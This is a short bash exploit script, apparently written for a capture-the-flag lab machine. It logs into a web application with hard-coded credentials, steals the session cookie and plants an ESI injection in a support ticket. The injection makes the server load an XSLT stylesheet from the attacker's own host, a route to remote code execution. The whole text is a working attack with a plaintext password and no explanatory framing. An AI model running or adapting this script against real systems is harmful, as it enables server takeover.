#!/usr/bin/env bash

# php -S 10.10.14.2:9999 (on local)
payload_url='http://10.10.14.2:9999'

user="elisa@wink.co.uk"
pwd="Quick4cc3$$"

cookie=`http -f 'http://10.10.10.186:9001/login.php' \
email=$user password=$pwd -v | grep -oE 'PHPSESSID=.*;'`

x=$RANDOM$RANDOM
http -f 'http://10.10.10.186:9001/ticket.php' Cookie:$cookie \
msg="<esi:include src=\"$payload_url/xml\" dca=\"xslt\" stylesheet=\"$payload_url/xsl\"/>" \
title='TEST' id=$x >/dev/null

http http://10.10.10.186:9001/search.php?search=$x Cookie:$cookie -b

